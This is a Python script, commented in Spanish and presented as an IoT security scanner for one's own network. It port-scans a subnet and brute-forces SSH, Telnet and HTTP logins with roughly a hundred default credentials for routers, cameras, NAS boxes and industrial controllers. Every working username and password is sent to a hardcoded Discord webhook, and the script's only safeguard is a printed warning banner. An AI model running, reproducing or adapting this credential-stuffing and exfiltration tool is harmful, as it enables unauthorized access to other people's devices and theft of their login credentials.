#!/usr/bin/env python3
"""
IoT Security Scanner - SOLO PARA REDES PROPIAS
"""

import asyncio
import aiohttp
import socket
import ipaddress
import json
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Tuple
import paramiko
import telnetlib
import requests
from datetime import datetime

# ============================
# CONFIGURACIÓN
# ============================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466196642322710780/cK9VMedmPzrlsCo_sBTQXREQTuoIIf3oKBgn0JIOykLTh7gsOFEtDdk_0jNTviyre-pZ"  # REEMPLAZA
NETWORK = "192.168.1.0/24"
SCAN_PORTS = [22, 23, 80, 443, 554, 21, 3306, 8080, 8888]

# ============================
# CREDENCIALES SUPER VARIADAS - DIFERENTES USUARIOS
# ============================
CREDENTIALS = [
    # DIFERENTES USUARIOS, NO SOLO ADMIN
    ("admin", "password", "generic"),
    ("administrator", "password", "windows"),
    ("root", "123456", "linux"),
    ("user", "user", "generic"),
    ("test", "test", "testing"),
    ("guest", "guest", "guest"),
    ("support", "support", "support"),
    ("service", "service", "service"),
    ("operator", "operator", "industrial"),
    ("manager", "manager", "management"),
    ("supervisor", "supervisor", "supervisor"),
    ("sysadmin", "sysadmin", "sysadmin"),
    ("tech", "tech", "technical"),
    ("engineer", "engineer", "engineering"),
    ("installer", "installer", "installer"),
    ("maintenance", "maintenance", "maintenance"),
    ("security", "security", "security"),
    ("monitor", "monitor", "monitoring"),
    ("backup", "backup", "backup"),
    ("ftp", "ftp", "ftp"),
    ("anonymous", "anonymous", "ftp"),
    ("cisco", "cisco", "cisco"),
    ("ubnt", "ubnt", "ubiquiti"),
    ("mikrotik", "mikrotik", "mikrotik"),
    ("d-link", "d-link", "dlink"),
    ("dlink", "dlink", "dlink"),
    ("default", "default", "default"),
    ("admin", "1234", "generic"),
    ("root", "root", "linux"),
    ("admin", "admin123", "generic"),
    ("admin", "admin1234", "generic"),
    ("root", "toor", "linux"),
    ("admin", "password123", "generic"),
    ("user", "1234", "generic"),
    ("user", "12345", "generic"),
    ("user", "user123", "generic"),
    ("guest", "1234", "guest"),
    ("support", "1234", "support"),
    ("service", "1234", "service"),
    ("pi", "raspberry", "raspberry"),
    ("raspberry", "pi", "raspberry"),
    ("ubuntu", "ubuntu", "ubuntu"),
    ("debian", "debian", "debian"),
    ("centos", "centos", "centos"),
    ("oracle", "oracle", "oracle"),
    ("postgres", "postgres", "postgres"),
    ("mysql", "mysql", "mysql"),
    ("sql", "sql", "database"),
    ("web", "web", "web"),
    ("www", "www", "web"),
    ("http", "http", "web"),
    ("https", "https", "web"),
    ("ftpuser", "ftpuser", "ftp"),
    ("ftpadmin", "ftpadmin", "ftp"),
    ("nas", "nas", "nas"),
    ("synology", "synology", "synology"),
    ("qnap", "qnap", "qnap"),
    ("netgear", "netgear", "netgear"),
    ("linksys", "linksys", "linksys"),
    ("tplink", "tplink", "tplink"),
    ("tenda", "tenda", "tenda"),
    ("huawei", "huawei", "huawei"),
    ("zte", "zte", "zte"),
    ("alcatel", "alcatel", "alcatel"),
    ("nokia", "nokia", "nokia"),
    ("siemens", "siemens", "siemens"),
    ("schneider", "schneider", "schneider"),
    ("abb", "abb", "abb"),
    ("rockwell", "rockwell", "rockwell"),
    ("omron", "omron", "omron"),
    ("mitsubishi", "mitsubishi", "mitsubishi"),
    ("fanuc", "fanuc", "fanuc"),
    ("yaskawa", "yaskawa", "yaskawa"),
    ("hikvision", "hikvision", "camera"),
    ("dahua", "dahua", "camera"),
    ("axis", "axis", "camera"),
    ("bosch", "bosch", "camera"),
    ("samsung", "samsung", "camera"),
    ("sony", "sony", "camera"),
    ("panasonic", "panasonic", "camera"),
    ("canon", "canon", "camera"),
    ("foscam", "foscam", "camera"),
    ("vivotek", "vivotek", "camera"),
    ("arecont", "arecont", "camera"),
    ("geovision", "geovision", "camera"),
    ("avtech", "avtech", "camera"),
    ("dvr", "dvr", "dvr"),
    ("nvr", "nvr", "nvr"),
    ("camera", "camera", "camera"),
    ("security", "camera", "camera"),
    ("surveillance", "surveillance", "camera"),
    ("viewer", "viewer", "viewer"),
    ("operator", "operator123", "industrial"),
    ("admin", "", "empty_password"),
    ("root", "", "empty_password"),
    ("user", "", "empty_password"),
    ("guest", "", "empty_password"),
    ("admin", "admin", "default"),
    ("root", "root", "default"),
    ("user", "user", "default"),
    ("test", "test", "default"),
]

class IoTScanner:
    def __init__(self):
        self.results = []
        self.executor = ThreadPoolExecutor(max_workers=50)
        
    async def send_to_discord(self, ip: str, port: int, service: str, credentials: List[Tuple[str, str]]):
        """Envía resultados a Discord"""
        if not DISCORD_WEBHOOK.startswith("http"):
            return
            
        creds_text = "\n".join([f"{user}:{passw}" for user, passw, _ in credentials[:10]])
        
        embed = {
            "title": "⚠️ IoT Device Found",
            "description": f"**IP:** {ip}\n**Port:** {port}\n**Service:** {service}",
            "color": 0xFF0000,
            "fields": [
                {"name": "Credentials Found", "value": f"```{creds_text}```", "inline": False}
            ],
            "timestamp": datetime.utcnow().isoformat()
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                await session.post(DISCORD_WEBHOOK, json={"embeds": [embed]})
        except:
            pass

    def scan_port(self, ip: str, port: int) -> bool:
        """Escanea puerto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def test_ssh(self, ip: str, port: int, username: str, password: str) -> bool:
        """Prueba SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=port, username=username, 
                       password=password, timeout=5, banner_timeout=5)
            ssh.close()
            return True
        except:
            return False

    def test_telnet(self, ip: str, port: int, username: str, password: str) -> bool:
        """Prueba Telnet"""
        try:
            tn = telnetlib.Telnet(ip, port, timeout=5)
            tn.read_until(b"login:", timeout=3)
            tn.write(username.encode() + b"\n")
            tn.read_until(b"password:", timeout=3)
            tn.write(password.encode() + b"\n")
            result = tn.read_some()
            tn.close()
            return b"incorrect" not in result.lower() and b"fail" not in result.lower()
        except:
            return False

    def test_http(self, ip: str, port: int, username: str, password: str) -> bool:
        """Prueba HTTP Basic Auth"""
        try:
            url = f"http://{ip}:{port}"
            response = requests.get(url, auth=(username, password), timeout=5)
            return response.status_code != 401
        except:
            return False

    async def scan_device(self, ip: str, port: int):
        """Escanea un dispositivo específico"""
        open_credentials = []
        
        # Determinar servicio
        service = "unknown"
        if port == 22: service = "ssh"
        elif port == 23: service = "telnet"
        elif port in [80, 8080, 8888]: service = "http"
        elif port == 443: service = "https"
        elif port == 21: service = "ftp"
        elif port == 3306: service = "mysql"
        elif port == 554: service = "rtsp"
        
        # Probar credenciales
        for username, password, _ in CREDENTIALS:
            try:
                success = False
                if service == "ssh":
                    success = self.test_ssh(ip, port, username, password)
                elif service == "telnet":
                    success = self.test_telnet(ip, port, username, password)
                elif service in ["http", "https"]:
                    success = self.test_http(ip, port, username, password)
                
                if success:
                    open_credentials.append((username, password, service))
                    print(f"[+] {ip}:{port} - {username}:{password}")
                    
            except Exception as e:
                continue
        
        # Enviar a Discord si hay resultados
        if open_credentials:
            await self.send_to_discord(ip, port, service, open_credentials)

    async def scan_network(self):
        """Escanea toda la red"""
        print(f"[*] Escaneando red: {NETWORK}")
        
        # Obtener todas las IPs
        ips = [str(ip) for ip in ipaddress.ip_network(NETWORK).hosts()]
        
        # Escanear cada IP
        for ip in ips:
            print(f"[*] Escaneando {ip}...")
            for port in SCAN_PORTS:
                # Escanear puerto
                loop = asyncio.get_event_loop()
                is_open = await loop.run_in_executor(
                    self.executor, self.scan_port, ip, port
                )
                
                if is_open:
                    print(f"[+] {ip}:{port} - OPEN")
                    # Escanear dispositivo
                    await self.scan_device(ip, port)

    async def run(self):
        """Ejecuta el escáner completo"""
        print("[*] Iniciando escáner IoT...")
        print(f"[*] Credenciales cargadas: {len(CREDENTIALS)}")
        
        try:
            await self.scan_network()
        except KeyboardInterrupt:
            print("\n[*] Escaneo detenido por usuario")
        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    # ADVERTENCIA
    print("=" * 60)
    print("ADVERTENCIA: Este script es solo para redes propias")
    print("con autorización escrita. El uso no autorizado es ilegal.")
    print("=" * 60)
    
    scanner = IoTScanner()
    asyncio.run(scanner.run())

if __name__ == "__main__":
    main()
